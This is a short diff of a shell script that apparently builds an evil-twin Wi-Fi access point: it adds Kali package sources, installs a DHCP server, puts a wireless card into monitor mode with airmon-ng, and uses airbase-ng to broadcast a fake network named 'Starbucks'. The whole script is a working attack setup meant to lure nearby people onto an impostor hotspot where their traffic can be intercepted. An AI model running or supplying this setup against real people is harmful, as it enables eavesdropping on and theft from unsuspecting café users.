@@ -1,10 +1,12 @@
-#apt-get update
-#apt-get install isc-dhcp-server
+echo "deb https://http.kali.org/kali kali-rolling main non-free contrib" > /etc/apt/sources.list
+wget -q -O - https://archive.kali.org/archive-key.asc  | apt-key add
+apt-get update
+apt-get install isc-dhcp-server
 airmon-ng check kill
 airmon-ng start wlan1
-airodump-ng wlan1mon
+#airodump-ng wlan1mon
 
-mv /etc/dhcp/dhcp.conf /etc/dhcp/dhcpd-backup.conf
+mv /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd-backup.conf
 cp dhcpd.conf /etc/dhcp/dhcpd.conf
 
 airbase-ng -e Starbucks -c 11 wlan1mon
